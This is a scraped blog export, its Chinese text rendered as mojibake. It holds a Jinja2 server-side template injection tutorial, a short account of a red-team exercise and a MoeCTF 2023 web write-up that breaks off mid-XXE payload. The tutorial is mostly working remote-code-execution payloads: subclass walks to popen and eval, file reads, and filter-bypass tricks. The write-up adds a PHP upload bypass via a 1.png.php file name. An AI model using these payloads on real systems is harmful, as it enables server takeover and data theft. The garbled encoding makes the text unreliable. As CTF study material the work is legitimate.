str\næœ‰äº†è¿™ä¸ªçš„è¯æˆ‘ä»¬å¯ä»¥æŠŠæ˜¾ç¤ºåˆ°æµè§ˆå™¨ä¸­çš„å€¼å…¨éƒ¨è½¬æ¢ä¸ºå­—ç¬¦ä¸²å†é€šè¿‡ä¸‹æ ‡å¼•ç”¨ï¼Œå°±å¯ä»¥æ„é€ å‡ºä¸€äº›å­—ç¬¦äº†ï¼Œå†é€šè¿‡æ‹¼æ¥å°±èƒ½æ„æˆç‰¹å®šçš„å­—ç¬¦ä¸²ã€‚\n\n```python\n>>>().__class__ \n<class 'tuple'>\n>>>(().__class__|string)[1] #æ³¨æ„è¿™é‡Œè¦å…ˆ()æ‹¬èµ·æ¥ç„¶åå†ç”¨ä¸‹æ ‡è°ƒç”¨\nc\n```\n\n## select\n\nå’Œä¹‹å‰çš„ç»“åˆèµ·æ¥æœ‰å¤§ä½œç”¨\n\n```python\n>>>()|select|string\n<generator object select_or_reject at 0x7fc7678cdf90>\n```\n\nç„¶åæˆ‘ä»¬å°±å¯ä»¥åˆ‡å­—ç¬¦äº†\n\n```python\n(()|select|string)[24]~\n(()|select|string)[24]~\n(()|select|string)[15]~\n(()|select|string)[20]~\n(()|select|string)[6]~\n(()|select|string)[18]~\n(()|select|string)[18]~\n(()|select|string)[24]~\n(()|select|string)[24]\n\nå¾—åˆ°å­—ç¬¦ä¸²\"__class__\"\n```\n\n## list\n\nè½¬æ¢æˆåˆ—è¡¨\n\næ›´å¤šçš„ç”¨é€”æ˜¯é…åˆä¸Šé¢çš„stringè½¬æ¢æˆåˆ—è¡¨ï¼Œå°±å¯ä»¥è°ƒç”¨åˆ—è¡¨é‡Œé¢çš„æ–¹æ³•å–å­—ç¬¦äº†\n\nå…¶å®æ›´å¤šçš„æ˜¯å¯ä»¥ç”¨listçš„å‡½æ•°äº†\n\n```python\n>>>()|select|string|list\n['<', 'g', 'e', 'n', 'e', 'r', 'a', 't', 'o', 'r', ' ', 'o', 'b', 'j', 'e', 'c', 't', ' ', 's', 'e', 'l', 'e', 'c', 't', '_', 'o', 'r', '_', 'r', 'e', 'j', 'e', 'c', 't', ' ', 'a', 't', ' ', '0', 'x', '7', 'f', 'c', '7', '6', '7', '8', 'c', 'd', 'f', '2', '0', '>']['<', 'g', 'e', 'n', 'e', 'r', 'a', 't', 'o', 'r', ' ', 'o', 'b', 'j', 'e', 'c', 't', ' ', 's', 'e', 'l', 'e', 'c', 't', '_', 'o', 'r', '_', 'r', 'e', 'j', 'e', 'c', 't', ' ', 'a', 't', ' ', '0', 'x', '7', 'f', 'c', '7', '6', '7', '8', 'c', 'd', 'f', '2', '0', '>']\n>>>(()|select|string|list)[1]\ng\n```\n\n# å˜é‡\n\né™¤äº†æ ‡å‡†çš„pythonè¯­æ³•ä½¿ç”¨ç‚¹`.`å¤–ï¼Œè¿˜å¯ä»¥ä½¿ç”¨ä¸­æ‹¬å·`[]`æ¥è®¿é—®å˜é‡çš„å±æ€§\n\n```python\n{{\"\".__class__}}\n{{\"\"['__classs__']}}\n```\n\n## æ‹¼æ¥ï¼š\n\n```\n\"__cla\"+\"ss__\"`å…¶å®ä¸ç”¨åŠ ä¸­é—´çš„åŠ å·ä¹Ÿå¯ä»¥ ç›´æ¥`\"__cla\"\"ss__\"\n```\n\n## åè½¬\n\n`\"__ssalc__\"[::-1]` å…¶å®æ˜¯pythonçš„åˆ‡ç‰‡\n\n## asciiè½¬æ¢\n\n```python\n\"{0:c}\".format(97)='a'\n\"{0:c}{1:c}{2:c}{3:c}{4:c}{5:c}{6:c}{7:c}{8:c}\".format(95,95,99,108,97,115,115,95,95)='__class__'\n>>>\"\"[\"{0:c}{1:c}{2:c}{3:c}{4:c}{5:c}{6:c}{7:c}{8:c}\".format(95,95,99,108,97,115,115,95,95)]\n<class 'str'>\n```\n\n## ç¼–ç ç»•è¿‡\n\n```python\n\\x5f\\x5fclass\\x5f\\x5f #16è¿›åˆ¶ __class__\n>>>\"\"[\"\\x5f\\x5fclass\\x5f\\x5f\"]\n<class 'str'>\n```\n\n\n\n## åœ¨jinja2é‡Œé¢å¯ä»¥åˆ©ç”¨~è¿›è¡Œæ‹¼æ¥\n\n```python\n{%set a='__cla' %}{%set b='ss__'%}{{\"\"[a~b]}}\n```\n\n# SSTIè¯­å¥æ„é€ \n\n## é¦–å…ˆå°±æ˜¯è¦æ‹¿åˆ°å½“å‰ç±»\n\n```python\n{{\"\".__class__}}\næˆ–è€…\n{{().class}}\n```\n\n## æ‹¿object\n\nä¹Ÿå°±æ˜¯éœ€è¦objectç„¶åå†ä»å®ƒçš„å­ç±»ä¸­æ‰¾æˆ‘ä»¬å¯ä»¥åˆ©ç”¨çš„\n\n```python\n{{\"\".__class__.__mro__[1]}}\n{{\"\".__class__.__mro__[-1]}}\n\"\".__class__.__bases__[0]\n{{\"\".__class__.__base__}}\n```\n\n## æ‹¿åŸºç±»çš„å­ç±»\n\nç”¨`__subclasses__()`è·å–å­ç±»\n\nå¤§å¤šæ•°åˆ©ç”¨çš„æ˜¯`os.wrap_close`è¿™ä¸ªç±»\n\nç„¶åå°±æ˜¯æ¥æ‰¾æˆ‘ä»¬æƒ³è¦çš„å†…å®¹ è°ƒæ•™gptå¸®æˆ‘ä»¬å†™ä¸€ä¸ª\n\n```python\ndef format_content(content):\n    lines = content.split(\",\")  # ä»¥é€—å·ä¸ºåˆ†éš”ç¬¦å°†å†…å®¹æ‹†åˆ†æˆè¡Œ\n    formatted_lines = [f\"{i + 1}. {line.strip()}\" for i, line in enumerate(lines)]  # ä¸ºæ¯ä¸€è¡Œæ·»åŠ åºå·\n    formatted_content = \"\\n\".join(formatted_lines)  # å°†æ ¼å¼åŒ–åçš„è¡Œé‡æ–°ç»„åˆæˆå­—ç¬¦ä¸²\n    return formatted_content\n\nfilename = \"content.txt\"\n\nwith open(filename, 'r') as file:\n    input_content = file.read()\n\nformatted_content = format_content(input_content)\nprint(\"æ ¼å¼åŒ–åçš„å†…å®¹:\") #æ‰¾åˆ°çš„åºå·éœ€è¦-1 æ³¨æ„ä¸€ä¸‹\nprint(formatted_content)\n```\n\nåªè¦å°†å‰åçš„`[]`åˆ å» ç„¶åæ”¾åˆ°content.txtå°±èƒ½è‡ªåŠ¨å¸®æˆ‘ä»¬æ ‡ä¸Šåºå·äº† ç„¶ååºå·è¦-1 å› ä¸ºè„šæœ¬æ˜¯ä»1å¼€å§‹çš„\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1692349329941-cb5af00f-68ae-4fa1-90cb-496a1cedb40d.png)\n\n## __init__æ–¹æ³•è¿›è¡Œåˆå§‹åŒ–ç±»\n\n```python\n>>>{{\"\".__class__.__base__.__subclasses__()[132].__init__}}\n<function _wrap_close.__init__ at 0x7f2ee6fb25e0>\n```\n\n## ç„¶åå†è°ƒç”¨__globals__è·å–åˆ°æ–¹æ³•å†…ä»¥å­—å…¸çš„å½¢å¼è¿”å›çš„æ–¹æ³•ã€å±æ€§\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1692349601730-0a12bdff-7cdb-44f9-a0b4-5db308ab3cc9.png)\n\nç°åœ¨ç”¨å‘½ä»¤æ‰§è¡Œå‡½æ•°æˆ–è€…æ¨¡å—å°±è¡Œäº†\n\n```python\n>>>{{\"\".__class__.__base__.__subclasses__()[132].__init__.__globals__['popen']('ls /').read()}}\n```\n\næœ‰ä¸€ä¸ªå¾ˆå‰å®³çš„æ¨¡å—æ˜¯**buildtins**é‡Œé¢æœ‰eval()ç­‰å‡½æ•°å¯ä»¥ç”¨æ¥rce\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1692349815755-69fb51d9-5140-4b90-9be5-72c61c2cd7e0.png)\n\n```python\n{{\"\".__class__.__base__.__subclasses__()[132].__init__.__globals__['__builtins__']['eval'](\"__import__('os').popen('cat /flag').read()\")}}\n```\n\n# SSTIå¸¸è§çš„ç»•è¿‡æ–¹å¼\n\n## ç»•è¿‡.\n\n1. å‰é¢ä¹Ÿä¸¾äº†å¾ˆå¤šä¾‹å­ å¯ä»¥ç”¨`[]`æ¥ä»£æ›¿\n\n```python\n{{\"\".__class__}}={{\"\"['__class']}}\n```\n\n1. å¯ä»¥ç”¨attr()è¿‡æ»¤å™¨ \n\n```python\n{{\"\".__class__}}={{\"\"|attr('__class__')}}\n```\n\n## ç»•è¿‡_\n\n1. é€šè¿‡listè·å–å­—ç¬¦åˆ—è¡¨ï¼Œç„¶åç”¨popæ¥è·å–_ å…¶å®å°±æ˜¯å»æˆª_\n\n```python\n{% set a=(()|select|string|list).pop(24)%}{%print(a)%}\n```\n\n1. é€šè¿‡åå…­è¿›åˆ¶ç¼–ç  \n\n```python\n{{()[\"\\x5f\\x5fclass\\x5f\\x5f\"]}} ={{().__class__}}\n```\n\n## ç»•è¿‡[]\n\nå¯ä»¥ä½¿ç”¨__getitem__é­”æœ¯æ–¹æ³• ç®€å•è¯´å°±æ˜¯æŠŠä¸­æ‹¬å·è½¬æ¢ä¸ºæ‹¬å·\n\n```python\n__bases__[0]=__bases__.__getitem__(0)\n```\n\nå…¶å®æœ¬è´¨æ˜¯æˆ‘ä»¬ç”¨[]çš„æ—¶å€™ è°ƒç”¨çš„å°±æ˜¯è¿™ä¸ªé­”æœ¯æ–¹æ³•è€Œå·²\n\n## ç»•è¿‡èŠ±æ‹¬å·\n\nå¯ä»¥ç”¨`{%%}`bypass è¿™æ—¶å°±è¦åœ¨é‡Œé¢ç”¨print()æ¥æ‰“å°ç»“æœäº†\n\n```python\n{{\"\".__class__.__bases__[0]. __subclasses__()[138].__init__.__globals__['popen']('whoami').read()}}\nä¿®æ”¹ä¸º\n{%print(\"\".__class__.__bases__[0]. __subclasses__()[138].__init__.__globals__['popen']('whoami').read())%}\n```\n\nä¹Ÿå¯ä»¥å€ŸåŠ©forå¾ªç¯å’Œifè¯­å¥æ¥æ‰§è¡Œå‘½ä»¤\n\n```python\n{%for i in ''.__class__.__base__.__subclasses__()%}{%if i.__name__ =='_wrap_close'%}{%print i.__init__.__globals__['popen']('whoami').read()%}{%endif%}{%endfor%}\n```\n\næ³¨æ„è¿™é‡Œå¾ªç¯è¯­å¥ æœ‰`{%for}`å°±è¦æœ‰`{%endfor%}`\n\næœ‰`{%if}` å°±è¦æœ‰`{%endif%}`\n\n## ç»•è¿‡å•å¼•å·å’ŒåŒå¼•å·\n\nå½“å•å¼•å·å’ŒåŒå¼•å·è¢«banæ—¶ï¼Œæˆ‘ä»¬é€šå¸¸é‡‡ç”¨`request.args.a`ï¼Œç„¶åç»™aèµ‹å€¼è¿™ç§æ–¹å¼æ¥è¿›è¡Œç»•è¿‡\n\n```python\n{{url_for.__globals__[request.args.a]}}&a=__builtins__  ç­‰åŒäº {{url_for.__globals__['__builtins__']}}\n```\n\nåŸç†\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1692353373357-ff1aea78-b318-4a51-b0ae-8ed11fcc5d7b.png)\n\nå¦‚æœargsä¹Ÿè¢«ç¦äº†\n\nå¯ä»¥é‡‡ç”¨`request.cookies`å’Œ`request.values`ï¼Œä»–ä»¬åˆ©ç”¨çš„æ–¹å¼å¤§åŒå°å¼‚\n\n```python\nGET:{{url_for.__globals__[request.cookies.a]}}\nCOOkie: \"a\" :'__builtins__'\n```\n\n## ç»•è¿‡æ•°å­—\n\nå¯ä»¥é€šè¿‡countæ¥å¾—åˆ°æ•°å­—\n\n```python\n{{(dict(e=a)|join|count)}} #1\n{{(dict(eee=a)|join|count)}}#3\n```\n\nåœ¨è¿™é‡Œjoinå°†å­—å…¸çš„é”®è¿æ¥èµ·æ¥ ç„¶åcount\n\n## ç»•è¿‡å…³é”®å­—\n\nå’Œä¸Šé¢ç›¸åŒçš„åŸç† joinæ‹¼æ¥\n\n```python\n{{dict(__in=a,it__=a)|join}}  =__init__\n```\n\n# å¸¸ç”¨payload\n\n```python\n1ã€ä»»æ„å‘½ä»¤æ‰§è¡Œ\n{%for i in ''.__class__.__base__.__subclasses__()%}{%if i.__name__ =='_wrap_close'%}{%print i.__init__.__globals__['popen']('dir').read()%}{%endif%}{%endfor%}\n2ã€ä»»æ„å‘½ä»¤æ‰§è¡Œ\n{{\"\".__class__.__bases__[0]. __subclasses__()[138].__init__.__globals__['popen']('cat /flag').read()}}\n//è¿™ä¸ª138å¯¹åº”çš„ç±»æ˜¯os._wrap_closeï¼Œåªéœ€è¦æ‰¾åˆ°è¿™ä¸ªç±»çš„ç´¢å¼•å°±å¯ä»¥åˆ©ç”¨è¿™ä¸ªpayload\n3ã€ä»»æ„å‘½ä»¤æ‰§è¡Œ\n{{url_for.__globals__['__builtins__']['eval'](\"__import__('os').popen('dir').read()\")}}\n4ã€ä»»æ„å‘½ä»¤æ‰§è¡Œ\n{{x.__init__.__globals__['__builtins__']['eval'](\"__import__('os').popen('cat flag').read()\")}}\n//xçš„å«ä¹‰æ˜¯å¯ä»¥ä¸ºä»»æ„å­—æ¯ï¼Œä¸ä»…ä»…é™äºx\n5ã€ä»»æ„å‘½ä»¤æ‰§è¡Œ\n{{config.__init__.__globals__['__builtins__']['eval'](\"__import__('os').popen('cat flag').read()\")}}\n6ã€æ–‡ä»¶è¯»å–\n{{x.__init__.__globals__['__builtins__'].open('/flag', 'r').read()}}\n//xçš„å«ä¹‰æ˜¯å¯ä»¥ä¸ºä»»æ„å­—æ¯ï¼Œä¸ä»…ä»…é™äºx\n```\n\n\n\n# åè¨€ï¼š\n\nåšé¢˜æ…¢æ…¢è¡¥å……\n\nå‚è€ƒï¼šhttps://tttang.com/archive/1698/#toc__4 \n","categories":["çŸ¥è¯†å­¦ä¹ "]},{"title":"ç¬¬ä¸€æ¬¡hwã®ç»å†","url":"/post/ccf2062.html","content":"\nçªå‘æ¶ç–¾\n\n<!--more-->\n\næš‘å‡åˆ°ä¸€åŠçªç„¶è¯´è¦å›å­¦æ ¡å‚åŠ hwï¼Œä¸€å¼€å§‹åœ¨å»ä¸ä¸å»çš„çº ç»“ä¸­ï¼Œä½†æ˜¯ç”±äºå­¦ä¹ çš„å¥½å¥‡å¿ƒé©±ä½¿å’Œéš¾å¾—çš„æœºä¼šï¼Œæœ€åè¿˜æ˜¯æŠ¥äº†åï¼Œè™½ç„¶äº”å¤©é™ªè·‘ï¼Œå¹²çš„éƒ½æ˜¯çº¯çº¯çš„ä½“åŠ›æ´»ï¼Œä½†æ˜¯æ€»ä½“è¿˜æ˜¯å¾ˆä¸é”™çš„ä¸€æ¬¡å­¦ä¹ ç»å†ï¼\n\nå› ä¸ºè¯é¢˜æ¯”è¾ƒæ¶‰å¯†ï¼ŒåŸè°…æ²¡æœ‰å›¾ç‰‡çš„çº¯æ–‡å­—å‘ç—…è¿‡ç¨‹ï¼Œè¯·æŠ¤çœ¼ã€‚ã€‚ã€‚\n\n# èµ›å‰\n\nå› ä¸ºçªç„¶æ¥æ¶ˆæ¯æ²¡æœ‰æå‰ä¹°æœºç¥¨ï¼Œéš”å‡ å¤©ä¹°æœºç¥¨çš„è¯å°±å¾ˆè´µï¼ŒèŠ±äº†æˆ‘æ•´æ•´1500/(ã„’oã„’)/~~ ç©·ç‹—çš„çœ¼æ³ªè½äº†ä¸‹æ¥\n\nç„¶åå°±æ˜¯å›å¯å®¤ï¼Œæœ€æ¶å¿ƒçš„æ˜¯è¿˜è¦ç”³è¯·å®¿èˆé€šæ°´ç”µï¼Œè¿˜è¦è‡³å°‘ä¸¤ä¸ªäººåœ¨ä¸€ä¸ªå¯å®¤ï¼Œæ˜¯ç‰›é­”è„‘å­æœ‰ç—…ï¼Œéƒ½æ˜¯æˆå¹´äººæ¶å¿ƒäººå¹²å˜›ï¼Œå¥½åœ¨æ˜¯å·§å¦™çš„åŒ–è§£äº†\n\nä¸çŸ¥é“å’‹äº†å›æ¥æˆ‘çš„å°ç”µç“¶è½¦å®ƒä¸åŠ¨äº†ï¼Œå¤ªå¤¸å¼ äº†ï¼Œæˆ‘çš„çˆ¹ä»–ä¸åŠ¨äº†ï¼Œä¿®è½¦çš„äººå› ä¸ºæ˜¯å‡æœŸä¹Ÿä¸åœ¨ï¼Œå¾ˆéš¾æƒ³è±¡æˆ‘æ˜¯æ€ä¹ˆåœ¨å¤§çƒ­å¤©é‡Œå¾’æ­¥åœ¨æ ¡å›­ä¸­ç©¿æ¢­ï¼Œé‚£å…±äº«è½¦çš„è½¦é€Ÿå’Œä½ç½®çœŸçš„æ˜¯å¤ªè®©äººé€†å¤©ä¸æƒ³ç¢°ã€‚\n\næ€»çš„ä¸€å¥è¯å°±æ˜¯äº‹äº‹ä¸é¡ºã€‚ã€‚ã€‚ã€‚ \n\nä¸è¿‡è¿™äº›é—®é¢˜éƒ½ä¸å¤§\n\n# è¢« ï¼Ÿå›´ç»•çš„äº”å¤©\n\nå¼€å§‹ä¸‰å¤©å§ä¼°è®¡æ˜¯ï¼Œæ¯«æ— å¤´ç»ªï¼Œä¸€å¼€å§‹å°±æ˜¯ç…§ç€ç½‘ä¸Šæ•™ç¨‹å»æ”¶é›†å­åŸŸåï¼Œæ”¶é›†ipï¼Œå¾ˆè´¹åŠ²ï¼Œå¥½åœ¨å¥½åƒæ˜¯ç¬¬äºŒå¤©ï¼Œå‘äº†èµ„äº§è¡¨ï¼Œç»ˆäºæ˜¯æœ‰ç‚¹ç³»ç»Ÿæ€§æ•´ç†å¥½çš„ä¿¡æ¯äº†\n\nä¹Ÿæ˜¯å€Ÿç€è¿™æ¬¡çš„hwï¼Œå¯¹äºåŸŸå å­åŸŸå ipcæ®µ ç«¯å£ fofa å®å¡”ç­‰ æœ‰äº†æ›´æ·±çš„è®¤è¯†\n\nå¼±å£ä»¤æ„Ÿè§‰ç»è¿‡å¤šæ¬¡hwä¹‹åï¼Œç›¸è¾ƒäºä¹‹å‰çš„è¯ï¼Œä¼šå°‘å¾ˆå¤šï¼Œè¿™æ¬¡æˆ‘æ‰¾åˆ°çš„éƒ½æ˜¯æœªæˆæƒè®¿é—®ï¼Œç›¸è¾ƒäºå¼±å£ä»¤ï¼Œè¿™æ¬¡æœªæˆæƒè®¿é—®çš„æ´æ˜¯æ›´å¤šçš„ã€‚\n\nå½“ç„¶å…¥å£éƒ½æ˜¯è¿™äº›ä¸èµ·çœ¼çš„å°æ¼æ´ ä½†æ˜¯å°±æ˜¯å› ä¸ºè¿™äº›å°æ¼æ´ä¼šå¼•å‘ä¸€è¿ä¸²çš„æ•ˆåº”  \n\nè€Œä¸”å¦‚æœå¼±å£ä»¤ä¸æ˜¯ç±»ä¼¼äºadmin/adminè¿™æ ·å°ç™½å¯†ç ï¼Œé‚£ä¹ˆè¦æƒ³é€šè¿‡ç¤¾å·¥ç®¡ç†å‘˜å»é’ˆå¯¹çš„åšä¸€ä¸ªå¯†ç æœ¬æ˜¯æ¯”è¾ƒå›°éš¾å’Œéº»çƒ¦çš„ã€‚\n\nå…¶æ¬¡å°±æ˜¯è¦å¯¹å·²ç»æ”¶é›†çš„ä¸€äº›èµ„äº§ä¿¡æ¯è¿›è¡Œæ•´ç†å’Œç»Ÿè®¡ï¼Œè¿™æ ·å¯ä»¥é¿å…é‡å¤æ€§æ“ä½œï¼Œä¹Ÿä¼šä½¿å¾—æ•´ä¸ªæµç¨‹è¿›è¡Œçš„æ›´æœ‰æ¡ç†\n\nå‘åŠ›æ˜¯åœ¨æœ€åä¸€å¤©å¥½åƒæ˜¯æ‰¾äº†ä¸‰ä¸ªæœªæˆæƒï¼Œç„¶åå…¶ä¸­ä¸€ä¸ªé‡Œé¢æœ‰ç€40ä¸ªæ‘„åƒå¤´ç¾ç¾çš„åƒäº†ä¸€æ³¢åˆ†\n\nå‚åŠ hwçš„å¸ˆå‚…ä»¬éƒ½å¤ªå¼ºäº†ï¼Œæˆ‘ä»¬å­¦æ ¡çš„ğŸ‘´ä»¬ä¹Ÿå¾ˆğŸ‚ï¼Œéƒ½æ˜¯å¤§ä½¬ï¼Œç¾¡æ…•æï¼Œèƒ½å’Œå‰å®³çš„äººä¸€èµ·å­¦ä¹ çœŸçš„æ˜¯ä¸€ä»¶å¾ˆcoolçš„äº‹æƒ…\n\nå…¶æ¬¡è¿˜æœ‰æ„å¤–çš„æ”¶è·~\n\n# ç»“å°¾\n\nå­¦ä¹ çŸ¥è¯†æœ¬å°±æ˜¯ä¸ªå½“å­™å­çš„è¿‡ç¨‹ï¼Œå¸Œæœ›æœªæ¥çš„è‡ªå·±ä¹Ÿèƒ½å¤ŸåŠæ—¶æŠ“ä½æœºä¼šï¼Œä¸è¦å®³æ€•å¤±è´¥å§ï¼Œæ¯•ç«Ÿç›¸æ¯”äºæˆåŠŸåœ¨æˆ‘èº«ä¸Šå¤±è´¥æ€»æ˜¯æ¥çš„æ›´é¢‘ç¹äº›ï¼Œä½†æ˜¯èƒ½å­¦åˆ°æ–°ä¸œè¥¿ï¼Œå¤±è´¥åˆå¦‚ä½•å‘¢ã€‚\n\nKeep Hackingï¼\n","categories":["æ„Ÿæ‚Ÿ"]},{"title":"Moectf2023 WEBæ–¹å‘WP","url":"/post/a19b908f.html","content":"\næŒç»­æ›´æ–°\n\n<!--more-->\n\nå®Œå–„è‡ªå·± æ–°ç”Ÿèµ›éƒ½æ‰“ä¸äº†ä¸€ç‚¹\n\nè¿™æ¬¡é¶æœºå¼€å¯æ–¹å¼ä¸é”™æ æŒºæ–°é¢–çš„\n\n# http\n\næ­£å¸¸è¯·æ±‚å‚æ•°è€ƒç‚¹ payloadå¦‚ä¸‹\n\n```plain\nPOST /?UwU=u HTTP/1.1\nHost: localhost:63279\nCache-Control: max-age=0\nsec-ch-ua: \nsec-ch-ua-mobile: ?0\nsec-ch-ua-platform: \"\"\nUpgrade-Insecure-Requests: 1\nUser-Agent: MoeBrowser\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\nSec-Fetch-Site: none\nSec-Fetch-Mode: navigate\nSec-Fetch-User: ?1\nSec-Fetch-Dest: document\nAccept-Encoding: gzip, deflate\nAccept-Language: zh-CN,zh;q=0.9\nCookie: character=admin\nConnection: close\nX-Forwarded-For: 127.0.0.1\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 5\n\nLuv=u\n```\n\n# Webå…¥é—¨æŒ‡åŒ—\n\npdfæœ«å°¾æœ‰ä¸€ä¸²16è¿›åˆ¶ç  è½¬äº†å°±è¡Œ\n\n# cookie\n\néšä¾¿æ³¨å†Œä¸ªè´¦å·ç„¶åç™»å½•å°†cookie base64è§£ç \n\næ”¹æˆå¦‚ä¸‹\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1692180097881-982b5602-aebd-40ce-a215-5f243a2b1000.png)\n\nç„¶åæ‰“å…¥cookie è®¿é—®/flag å³å¯\n\n# å½¼å²¸çš„flag\n\nF12 æ‰¾å°±æœ‰\n\n# gas!gas!gas!\n\nçœ‹æ¸…è§„åˆ™\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1692180247032-9cbf0e31-ac5e-45b7-abcd-3d1fd538f4f2.png)\n\næ²¹é—¨å’ŒæŠ“åœ°æˆåæ¯”ä¾‹ æ–¹å‘è¦åæ‰“ å…¶æ¬¡è¦åœ¨0.5ç§’è¿›è¡Œä¸‹ä¸€æ­¥ ç›´æ¥è„šæœ¬æ¢­å“ˆ\n\n```python\nfrom requests import *\ns = session()\nurl = 'http://localhost:64026/'\npayload = {\"driver\":\"admin\",\"steering_control\":0,\"throttle\":1}\npayload_1 = {\"driver\":\"admin\",\"steering_control\":1,\"throttle\":0} #å¼¯é“å‘å·¦ï¼ŒæŠ“åœ°åŠ›å¤ªå°äº†ï¼\npayload_2 = {\"driver\":\"admin\",\"steering_control\":-1,\"throttle\":0} #å¼¯é“å‘å³ï¼ŒæŠ“åœ°åŠ›å¤ªå°äº†ï¼ \npayload_3 = {\"driver\":\"admin\",\"steering_control\":0,\"throttle\":1} #å¼¯é“ç›´è¡Œï¼Œä¿æŒè¿™ä¸ªé€Ÿåº¦\npayload_4 = {\"driver\":\"admin\",\"steering_control\":1,\"throttle\":2} #å¼¯é“å‘å·¦ï¼ŒæŠ“åœ°åŠ›å¤ªå¤§äº†ï¼\npayload_5 = {\"driver\":\"admin\",\"steering_control\":-1,\"throttle\":2}#å¼¯é“å‘å³ï¼ŒæŠ“åœ°åŠ›å¤ªå¤§äº†ï¼\npayload_6 = {\"driver\":\"admin\",\"steering_control\":-1,\"throttle\":1} #å¼¯é“å‘å³ï¼Œä¿æŒè¿™ä¸ªé€Ÿåº¦ \npayload_7 = {\"driver\":\"admin\",\"steering_control\":1,\"throttle\":1} #å¼¯é“å‘å·¦ï¼Œä¿æŒè¿™ä¸ªé€Ÿåº¦\npayload_8 = {\"driver\":\"admin\",\"steering_control\":0,\"throttle\":2}#å¼¯é“ç›´è¡Œï¼ŒæŠ“åœ°åŠ›å¤ªå¤§äº†ï¼\npayload_9 = {\"driver\":\"admin\",\"steering_control\":0,\"throttle\":0}#å¼¯é“ç›´è¡Œï¼ŒæŠ“åœ°åŠ›å¤ªå°äº†ï¼\nr = s.post(url=url,data=payload)\nfor i in range(6):\n    if \"å¼¯é“å‘å·¦ï¼ŒæŠ“åœ°åŠ›å¤ªå°äº†ï¼\" in r.text:\n        r = s.post(url=url,data=payload_1)\n    elif \"å¼¯é“å‘å³ï¼ŒæŠ“åœ°åŠ›å¤ªå°äº†ï¼\" in r.text:\n        r = s.post(url=url,data=payload_2)\n    elif \"å¼¯é“ç›´è¡Œï¼Œä¿æŒè¿™ä¸ªé€Ÿåº¦\" in r.text:\n        r = s.post(url=url,data=payload_3)\n    elif \"å¼¯é“å‘å·¦ï¼ŒæŠ“åœ°åŠ›å¤ªå¤§äº†ï¼\" in r.text:\n        r = s.post(url=url,data=payload_4)\n    elif \"å¼¯é“å‘å³ï¼ŒæŠ“åœ°åŠ›å¤ªå¤§äº†ï¼\" in r.text:\n        r = s.post(url=url,data=payload_5)\n    elif \"å¼¯é“å‘å³ï¼Œä¿æŒè¿™ä¸ªé€Ÿåº¦\" in r.text:\n        r = s.post(url=url,data=payload_6)\n    elif \"å¼¯é“å‘å·¦ï¼Œä¿æŒè¿™ä¸ªé€Ÿåº¦\" in r.text:\n        r = s.post(url=url,data=payload_7)\n    elif \"å¼¯é“ç›´è¡Œï¼ŒæŠ“åœ°åŠ›å¤ªå¤§äº†ï¼\" in r.text:\n        r = s.post(url=url,data=payload_8)\n    elif \"å¼¯é“ç›´è¡Œï¼ŒæŠ“åœ°åŠ›å¤ªå°äº†ï¼\" in r.text:\n        r = s.post(url=url,data=payload_9)\n\nprint(r.text)\n```\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1692180361902-326ff3a2-3884-4558-8c29-bb6430ad1ae4.png)\n\n# moeå›¾åºŠ\n\nç»™äº†æºç upload.php\n\n```python\n<?php\n$targetDir = 'uploads/';\n$allowedExtensions = ['png'];\n\n\nif ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_FILES['file'])) {\n    $file = $_FILES['file'];\n    $tmp_path = $_FILES['file']['tmp_name'];\n\n    if ($file['type'] !== 'image/png') {\n        die(json_encode(['success' => false, 'message' => 'æ–‡ä»¶ç±»å‹ä¸ç¬¦åˆè¦æ±‚']));\n    }\n\n    if (filesize($tmp_path) > 512 * 1024) {\n        die(json_encode(['success' => false, 'message' => 'æ–‡ä»¶å¤ªå¤§']));\n    }\n\n    $fileName = $file['name'];\n    $fileNameParts = explode('.', $fileName);\n\n    if (count($fileNameParts) >= 2) {\n        $secondSegment = $fileNameParts[1];\n        if ($secondSegment !== 'png') {\n            die(json_encode(['success' => false, 'message' => 'æ–‡ä»¶åç¼€ä¸ç¬¦åˆè¦æ±‚']));\n        }\n    } else {\n        die(json_encode(['success' => false, 'message' => 'æ–‡ä»¶åç¼€ä¸ç¬¦åˆè¦æ±‚']));\n    }\n\n    $uploadFilePath = dirname(__FILE__) . '/' . $targetDir . basename($file['name']);\n\n    if (move_uploaded_file($tmp_path, $uploadFilePath)) {\n        die(json_encode(['success' => true, 'file_path' => $uploadFilePath]));\n    } else {\n        die(json_encode(['success' => false, 'message' => 'æ–‡ä»¶ä¸Šä¼ å¤±è´¥']));\n    }\n}\nelse{\n    highlight_file(__FILE__);\n}\n?>\n```\n\nè¿™é“é¢˜ä¸€å¼€å§‹æ²¡åšå‡ºæ¥ æœ‰ç‚¹è¢«å“ä½äº† åæ¥å‘ç°æ²¡å•¥\n\næ¯”è¾ƒé‡è¦çš„æ˜¯è¿™ä¸€å—\n\n```python\n $fileName = $file['name'];\n    $fileNameParts = explode('.', $fileName);\n\n    if (count($fileNameParts) >= 2) {\n        $secondSegment = $fileNameParts[1];\n        if ($secondSegment !== 'png') {\n            die(json_encode(['success' => false, 'message' => 'æ–‡ä»¶åç¼€ä¸ç¬¦åˆè¦æ±‚']));\n        }\n    } else {\n        die(json_encode(['success' => false, 'message' => 'æ–‡ä»¶åç¼€ä¸ç¬¦åˆè¦æ±‚']));\n    }\n```\n\nç„¶åå…¶å®æˆ‘ä»¬å°†ä¸Šä¼ æ–‡ä»¶æ”¹ä¸º1.png.phpå³å¯ ä»–åªä¼šæ£€æµ‹ç´¢å¼•ä¸º1çš„åç¼€æ˜¯å¦ä¸ºpng\n\nå¯èƒ½æ˜¯apacheçš„æ–‡ä»¶åè§£æç‰¹æ€§å§\n\n#  äº†è§£ä½ çš„åº§é©¾\n\nä¸€é“xxe\n\npayload:\n\n```python\n<?xml version=\"1.0\" encoding=\"UTF-8\" ?>\n<!DOCTYPE 